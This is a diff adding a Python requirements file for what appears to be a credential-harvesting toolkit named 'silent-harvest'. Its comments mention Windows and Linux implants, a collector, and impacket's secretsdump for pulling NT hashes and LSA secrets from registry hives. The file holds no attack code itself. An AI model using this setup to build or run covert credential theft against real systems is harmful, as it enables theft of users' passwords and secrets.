@@ -1,0 +1,11 @@
+# silent-harvest operator-side requirements
+# (implants need NOTHING: windows implant = in-box csc.exe, linux implant = stdlib)
+#
+# install:  python -m pip install -r requirements.txt
+# or:       tools\setup_env.ps1   (creates .venv with everything, no PATH pip needed)
+
+cryptography>=42.0        # collector + parsers + offline unlock (AEAD/AESGCM)
+
+# --- optional but recommended for the full offline chain ---
+impacket>=0.11            # secretsdump: hives -> NT hashes / LSA secrets
+                          # (offline_unlock degrades gracefully without it)
